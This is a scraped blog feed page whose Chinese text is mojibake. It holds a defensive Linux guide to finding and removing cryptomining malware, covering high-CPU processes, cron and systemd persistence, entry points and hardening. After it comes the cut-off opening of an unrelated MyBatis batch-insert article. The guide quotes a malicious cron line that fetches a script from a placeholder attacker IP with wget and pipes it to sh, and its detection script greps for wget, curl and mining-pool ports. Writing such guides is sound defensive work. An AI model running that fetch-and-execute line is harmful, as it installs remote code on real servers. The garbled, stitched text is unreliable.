            CPU é£™å‡æ˜¯æœåŠ¡å™¨è¢«æŒ–çŸ¿ç—…æ¯’æ”»å‡»æ€ä¹ˆåŠï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2717648476705773/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    90åæ™¨ä»”
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:21:43.000Z" title="Fri Jan 30 2026 13:21:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>CPU é£™å‡æ˜¯æœåŠ¡å™¨è¢«æŒ–çŸ¿ç—…æ¯’ï¼ˆå¦‚ xmrigã€kdevtmpfsiã€watchdogs ç­‰ï¼‰æ”»å‡»çš„å…¸å‹è¡¨ç°ã€‚è¿™ç±»æ¶æ„ç¨‹åºä¼šåˆ©ç”¨ä½ çš„æœåŠ¡å™¨èµ„æºè¿›è¡ŒåŠ å¯†è´§å¸æŒ–çŸ¿ï¼Œå¯¼è‡´ CPU æŒç»­ 100% å ç”¨ï¼Œç³»ç»Ÿå˜æ…¢ç”šè‡³å®•æœºã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€å¥—<strong>é’ˆå¯¹æ€§æ’æŸ¥ä¸æ¸…é™¤æ–¹æ¡ˆ</strong>ï¼Œé€‚ç”¨äº Linux ç³»ç»Ÿï¼ˆå¦‚ CentOSã€Ubuntuï¼‰ï¼š</p>
<hr/>
<h3 data-id="heading-0">ğŸ” ç¬¬ä¸€æ­¥ï¼šå¿«é€Ÿå®šä½é«˜ CPU è¿›ç¨‹</h3>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">æŸ¥çœ‹ CPU å ç”¨æœ€é«˜çš„è¿›ç¨‹</span>
top
<span class="hljs-meta prompt_">
# </span><span class="bash">æŒ‰ <span class="hljs-string">'P'</span>ï¼ˆå¤§å†™ï¼‰å¯æŒ‰ CPU ä½¿ç”¨ç‡æ’åº</span>
</code></pre>
<p>é‡ç‚¹å…³æ³¨ï¼š</p>
<ul>
<li>è¿›ç¨‹åå¯ç–‘ï¼ˆå¦‚ <code>kdevtmpfsi</code>ã€<code>xmrig</code>ã€<code>sysupdate</code>ã€<code>networkservice</code>ã€<code>watchdog</code>ã€éšæœºå­—ç¬¦ä¸²ï¼‰</li>
<li>ç”¨æˆ·ä¸æ˜¯ä½ åˆ›å»ºçš„ï¼ˆå¦‚ <code>nobody</code>ã€<code>daemon</code>ã€<code>redis</code> ç­‰ç³»ç»Ÿç”¨æˆ·è¿è¡ŒæœªçŸ¥ç¨‹åºï¼‰</li>
</ul>
<p>è®°ä¸‹ PID å’Œè¿›ç¨‹åã€‚</p>
<hr/>
<h3 data-id="heading-1">ğŸ•µï¸ ç¬¬äºŒæ­¥ï¼šæ·±å…¥åˆ†æå¯ç–‘è¿›ç¨‹</h3>
<p>å‡è®¾ä½ å‘ç°ä¸€ä¸ªå« <code>kdevtmpfsi</code> çš„è¿›ç¨‹å ç”¨äº† 95% CPUï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹è¯¥è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯ï¼ˆæ›¿æ¢ä¸ºå®é™… PIDï¼‰</span>
PID=12345
<span class="hljs-built_in">ls</span> -l /proc/<span class="hljs-variable">$PID</span>/exe          <span class="hljs-comment"># æŸ¥çœ‹å®ƒå®é™…æ‰§è¡Œçš„æ˜¯å“ªä¸ªæ–‡ä»¶</span>
<span class="hljs-built_in">cat</span> /proc/<span class="hljs-variable">$PID</span>/cmdline        <span class="hljs-comment"># æŸ¥çœ‹å¯åŠ¨å‘½ä»¤ï¼ˆå¯èƒ½å¸¦çŸ¿æ± åœ°å€ï¼‰</span>
<span class="hljs-built_in">cat</span> /proc/<span class="hljs-variable">$PID</span>/environ | <span class="hljs-built_in">tr</span> <span class="hljs-string">'\0'</span> <span class="hljs-string">'\n'</span>  <span class="hljs-comment"># æŸ¥çœ‹ç¯å¢ƒå˜é‡</span>
</code></pre>
<p>å¸¸è§è—åŒ¿è·¯å¾„ï¼š</p>
<ul>
<li><code>/tmp/</code></li>
<li><code>/dev/shm/</code></li>
<li><code>/var/tmp/</code></li>
<li><code>/usr/bin/.xxx</code>ï¼ˆéšè—æ–‡ä»¶ï¼‰</li>
<li><code>/root/.cache/</code></li>
</ul>
<hr/>
<h3 data-id="heading-2">ğŸ§¹ ç¬¬ä¸‰æ­¥ï¼šç»ˆæ­¢è¿›ç¨‹å¹¶åˆ é™¤æ–‡ä»¶</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç»ˆæ­¢è¿›ç¨‹</span>
<span class="hljs-built_in">kill</span> -9 12345

<span class="hljs-comment"># åˆ é™¤å¯¹åº”æ–‡ä»¶ï¼ˆæ ¹æ® /proc/PID/exe çš„ç»“æœï¼‰</span>
<span class="hljs-built_in">rm</span> -f /tmp/kdevtmpfsi
<span class="hljs-built_in">rm</span> -f /dev/shm/kdevtmpfsi
</code></pre>
<p>âš ï¸ <strong>æ³¨æ„</strong>ï¼šæœ‰äº›ç—…æ¯’ä¼šé€šè¿‡å®ˆæŠ¤è¿›ç¨‹æˆ–å®šæ—¶ä»»åŠ¡è‡ªåŠ¨é‡å¯ï¼æ‰€ä»¥ä¸èƒ½åª kill è¿›ç¨‹ï¼</p>
<hr/>
<h3 data-id="heading-3">â° ç¬¬å››æ­¥ï¼šæ£€æŸ¥æŒä¹…åŒ–å…¥å£ï¼ˆå…³é”®ï¼ï¼‰</h3>
<h4 data-id="heading-4">1. æ£€æŸ¥å®šæ—¶ä»»åŠ¡ï¼ˆcronï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash">crontab -l                    <span class="hljs-comment"># å½“å‰ç”¨æˆ·</span>
crontab -u root -l            <span class="hljs-comment"># root ç”¨æˆ·</span>
<span class="hljs-built_in">cat</span> /etc/crontab
<span class="hljs-built_in">ls</span> /etc/cron.d/
<span class="hljs-built_in">ls</span> /var/spool/cron/crontabs/  <span class="hljs-comment"># Ubuntu è·¯å¾„</span>
<span class="hljs-built_in">ls</span> /var/spool/cron/           <span class="hljs-comment"># CentOS è·¯å¾„</span>
</code></pre>
<p>ğŸ” å¸¸è§æ¶æ„ cron ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">*<span class="hljs-regexp">/5 * * * * wget -q -O- http:/</span><span class="hljs-regexp">/æ¶æ„IP/u</span>pdate.<span class="hljs-property">sh</span> | sh
<span class="hljs-meta">@reboot</span> /tmp/.<span class="hljs-property">sysupdate</span>
</code></pre>
<p>â†’ <strong>åˆ é™¤è¿™äº›è¡Œ</strong>ï¼Œæˆ–ç›´æ¥æ¸…ç©ºå¯ç–‘ç”¨æˆ·çš„ crontabï¼š</p>
<pre><code class="hljs language-bash" lang="bash">crontab -r   <span class="hljs-comment"># æ¸…ç©ºå½“å‰ç”¨æˆ· cronï¼ˆè°¨æ…ä½¿ç”¨ï¼‰</span>
</code></pre>
<h4 data-id="heading-5">2. æ£€æŸ¥ systemd æœåŠ¡ï¼ˆè¾ƒæ–°ç—…æ¯’ä¼šä¼ªè£…æˆæœåŠ¡ï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash">systemctl list-unit-files --<span class="hljs-built_in">type</span>=service | grep enabled
<span class="hljs-built_in">ls</span> /etc/systemd/system/
</code></pre>
<p>åˆ é™¤å¯ç–‘æœåŠ¡ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">systemctl stop malicious.service
systemctl <span class="hljs-built_in">disable</span> malicious.service
<span class="hljs-built_in">rm</span> -f /etc/systemd/system/malicious.service
</code></pre>
<h4 data-id="heading-6">3. æ£€æŸ¥ rc.localã€init.d ç­‰å¯åŠ¨é¡¹</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> /etc/rc.local
<span class="hljs-built_in">ls</span> /etc/init.d/ | grep -E <span class="hljs-string">"(sys|net|watch|update)"</span>
</code></pre>
<hr/>
<h3 data-id="heading-7">ğŸ” ç¬¬äº”æ­¥ï¼šå°å µå…¥ä¾µæºå¤´</h3>
<p>CPU é£™å‡é€šå¸¸æ˜¯<strong>å·²æœ‰æ¼æ´è¢«åˆ©ç”¨</strong>çš„ç»“æœã€‚å¸¸è§å…¥å£åŒ…æ‹¬ï¼š</p>





























<table><thead><tr><th>å…¥å£</th><th>ä¿®å¤å»ºè®®</th></tr></thead><tbody><tr><td><strong>Redis æœªæˆæƒè®¿é—®</strong></td><td>ç»‘å®š 127.0.0.1ï¼Œè®¾ç½®å¯†ç ï¼Œå…³é—­ AOF/RDB è‡ªåŠ¨åŠ è½½è„šæœ¬</td></tr><tr><td><strong>SSH å¼±å¯†ç çˆ†ç ´</strong></td><td>æ”¹ç”¨å¯†é’¥ç™»å½•ï¼Œç¦ç”¨ root ç™»å½•ï¼Œæ”¹ SSH ç«¯å£</td></tr><tr><td><strong>Web åº”ç”¨æ¼æ´ï¼ˆå¦‚ WordPressã€ThinkPHPï¼‰</strong></td><td>å‡çº§ CMS/æ¡†æ¶ï¼Œåˆ é™¤æœªä½¿ç”¨æ’ä»¶</td></tr><tr><td><strong>Docker API æš´éœ²</strong></td><td>ä¸è¦å°† 2375 ç«¯å£æš´éœ²åˆ°å…¬ç½‘</td></tr><tr><td><strong>Nginx/Apache é…ç½®é”™è¯¯å¯¼è‡´ç›®å½•éå†</strong></td><td>æ£€æŸ¥é…ç½®ï¼Œç¦æ­¢åˆ—å‡ºç›®å½•</td></tr></tbody></table>
<p>ğŸ‘‰ <strong>ç«‹å³æ£€æŸ¥ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹æœ€è¿‘çš„ SSH ç™»å½•ï¼ˆæ˜¯å¦æœ‰å¼‚å¸¸ IPï¼‰</span>
grep <span class="hljs-string">"Accepted"</span> /var/log/auth.log | <span class="hljs-built_in">tail</span> -20    <span class="hljs-comment"># Ubuntu</span>
grep <span class="hljs-string">"Accepted"</span> /var/log/secure | <span class="hljs-built_in">tail</span> -20      <span class="hljs-comment"># CentOS</span>

<span class="hljs-comment"># æŸ¥çœ‹ç›‘å¬ç«¯å£ï¼ˆæ˜¯å¦æœ‰ Redis 6379ã€MongoDB 27017 æš´éœ²ï¼Ÿï¼‰</span>
ss -tulnp
</code></pre>
<hr/>
<h3 data-id="heading-8">ğŸ›¡ï¸ ç¬¬å…­æ­¥ï¼šåŠ å›ºä¸ç›‘æ§</h3>
<ol>
<li>
<p><strong>å¯ç”¨é˜¿é‡Œäº‘ã€Œäº‘å®‰å…¨ä¸­å¿ƒã€</strong></p>
<ul>
<li>å…è´¹ç‰ˆå³å¯æ£€æµ‹æŒ–çŸ¿è¡Œä¸º</li>
<li>å¼€å¯ã€Œç—…æ¯’æŸ¥æ€ã€+ã€Œå…¥ä¾µæ£€æµ‹ã€</li>
</ul>
</li>
<li>
<p><strong>å®‰è£…å®æ—¶ç›‘æ§å·¥å…·</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®‰è£… atopï¼ˆè®°å½•å†å²èµ„æºä½¿ç”¨ï¼‰</span>
apt install atop -y   <span class="hljs-comment"># æˆ– yum install atop</span>
systemctl <span class="hljs-built_in">enable</span> --now atop
</code></pre>
</li>
<li>
<p><strong>é™åˆ¶æ™®é€šç”¨æˆ·æ‰§è¡Œæƒé™</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¾‹å¦‚ç¦æ­¢ /tmp æ‰§è¡Œç¨‹åºï¼ˆåœ¨ /etc/fstab ä¸­æ·»åŠ  noexecï¼‰</span>
mount -o remount,noexec,nosuid /tmp
mount -o remount,noexec,nosuid /dev/shm
</code></pre>
</li>
</ol>
<hr/>
<h3 data-id="heading-9">ğŸ’£ æç«¯å»ºè®®ï¼šé‡è£…ç³»ç»Ÿ</h3>
<p>å¦‚æœåå¤æ„ŸæŸ“ã€æ— æ³•å½»åº•æ¸…é™¤ï¼Œ<strong>æœ€å®‰å…¨çš„æ–¹å¼æ˜¯</strong>ï¼š</p>
<ol>
<li>åœ¨é˜¿é‡Œäº‘æ§åˆ¶å° <strong>åˆ›å»ºå½“å‰ç£ç›˜å¿«ç…§</strong>ï¼ˆç”¨äºå–è¯ï¼‰</li>
<li><strong>æ›´æ¢ç³»ç»Ÿç›˜</strong>ï¼ˆé‡è£…å¹²å‡€çš„å®˜æ–¹é•œåƒï¼‰</li>
<li><strong>ä»…æ¢å¤ä¸šåŠ¡æ•°æ®</strong>ï¼ˆä¸è¦æ¢å¤å¯æ‰§è¡Œæ–‡ä»¶ã€è„šæœ¬ã€é…ç½®æ–‡ä»¶ï¼‰</li>
<li><strong>é‡æ–°éƒ¨ç½²åº”ç”¨ï¼Œå¹¶ä¸¥æ ¼éµå¾ªå®‰å…¨è§„èŒƒ</strong></li>
</ol>
<hr/>
<h3 data-id="heading-10">âœ… é™„ï¼šå¿«é€Ÿæ£€æµ‹è„šæœ¬ï¼ˆå¯å¤åˆ¶è¿è¡Œï¼‰</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"=== é«˜ CPU è¿›ç¨‹ ==="</span>
ps aux --<span class="hljs-built_in">sort</span>=-%cpu | <span class="hljs-built_in">head</span> -n 10

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n=== å¯ç–‘å®šæ—¶ä»»åŠ¡ ==="</span>
grep -r <span class="hljs-string">""</span> /var/spool/cron/ /etc/cron* 2&gt;/dev/null | grep -v <span class="hljs-string">"^#"</span> | grep -E <span class="hljs-string">".(sh|py|pl|elf)|wget|curl|http"</span>

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n=== /tmp å’Œ /dev/shm ä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶ ==="</span>
find /tmp /dev/shm -<span class="hljs-built_in">type</span> f -executable 2&gt;/dev/null

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n=== å¤–è¿å¯ç–‘ IPï¼ˆæŒ–çŸ¿å¸¸è¿å¢ƒå¤–ï¼‰==="</span>
ss -tulnp | grep -E <span class="hljs-string">"(4444|5555|3333|stratum)"</span>  <span class="hljs-comment"># å¸¸è§çŸ¿æ± ç«¯å£</span>
</code></pre>
<p>ä¿å­˜ä¸º <code>check_mining.sh</code>ï¼Œ<code>chmod +x</code> åè¿è¡Œã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MyBatis æ‰¹é‡æ’å…¥ä»5åˆ†é’Ÿç¼©çŸ­åˆ°3ç§’ï¼Ÿæˆ‘çš„ä¸‰ä¸ªå…³é”®ä¼˜åŒ–]]></title>    <link>https://juejin.cn/post/7600982613653766194</link>    <guid>https://juejin.cn/post/7600982613653766194</guid>    <pubDate>2026-01-30T13:23:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600982613653766194" data-draft-id="7600787795478069294" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MyBatis æ‰¹é‡æ’å…¥ä»5åˆ†é’Ÿç¼©çŸ­åˆ°3ç§’ï¼Ÿæˆ‘çš„ä¸‰ä¸ªå…³é”®ä¼˜åŒ–"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-01-30T13:23:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çš®çš®æ—551"/> <meta itemprop="url" content="https://juejin.cn/user/2447981921436084"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MyBatis æ‰¹é‡æ’å…¥ä»5åˆ†é’Ÿç¼©çŸ­åˆ°3ç§’ï¼Ÿæˆ‘çš„ä¸‰ä¸ªå…³é”®ä¼˜åŒ–
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2447981921436084/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çš®çš®æ—551
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:23:21.000Z" title="Fri Jan 30 2026 13:23:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä¸Šå‘¨æ¥äº†ä¸ªæ•°æ®è¿ç§»çš„æ´»ï¼Œè¦æŠŠ10ä¸‡æ¡æ•°æ®ä»è€ç³»ç»Ÿå¯¼å…¥æ–°ç³»ç»Ÿã€‚</p>
<p>å†™äº†ä¸ªç®€å•çš„æ‰¹é‡æ’å…¥ï¼Œè·‘èµ·æ¥ä¸€çœ‹â€”â€”5åˆ†é’Ÿã€‚</p>
<p>é¢†å¯¼è¯´å¤ªæ…¢äº†ï¼Œèƒ½ä¸èƒ½å¿«ç‚¹ï¼Ÿ</p>
<p>æŠ˜è…¾äº†ä¸€ä¸‹åˆï¼Œæœ€åä¼˜åŒ–åˆ°3ç§’ï¼Œè®°å½•ä¸€ä¸‹è¿‡ç¨‹ã€‚</p>
<h3 data-id="heading-0"><strong>æœ€åˆçš„ä»£ç ï¼ˆ5åˆ†é’Ÿï¼‰</strong></h3>
<p>æœ€å¼€å§‹å†™çš„å¾ˆç®€å•ï¼Œforeachå¾ªç¯æ’å…¥ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// æ–¹å¼1ï¼šå¾ªç¯å•æ¡æ’å…¥ï¼ˆæœ€æ…¢ï¼‰</span>
forÂ (User user : userList) {
Â  Â  userMapper<span class="hljs-selector-class">.insert</span>(user);
}
</code></pre>
<p>10ä¸‡æ¡æ•°æ®ï¼Œæ¯æ¡éƒ½è¦èµ°ä¸€æ¬¡ç½‘ç»œè¯·æ±‚ã€ä¸€æ¬¡SQLè§£æã€ä¸€æ¬¡äº‹åŠ¡æäº¤ã€‚</p>
<p>ç®—ä¸€ä¸‹ï¼šå‡è®¾æ¯æ¡æ’å…¥éœ€è¦3msï¼Œ10ä¸‡æ¡å°±æ˜¯300ç§’ = 5åˆ†é’Ÿã€‚</p>
<p><strong>è¿™æ˜¯æœ€è ¢çš„å†™æ³•ï¼Œä½†æˆ‘è§è¿‡å¾ˆå¤šé¡¹ç›®éƒ½è¿™ä¹ˆå†™ã€‚</strong></p>
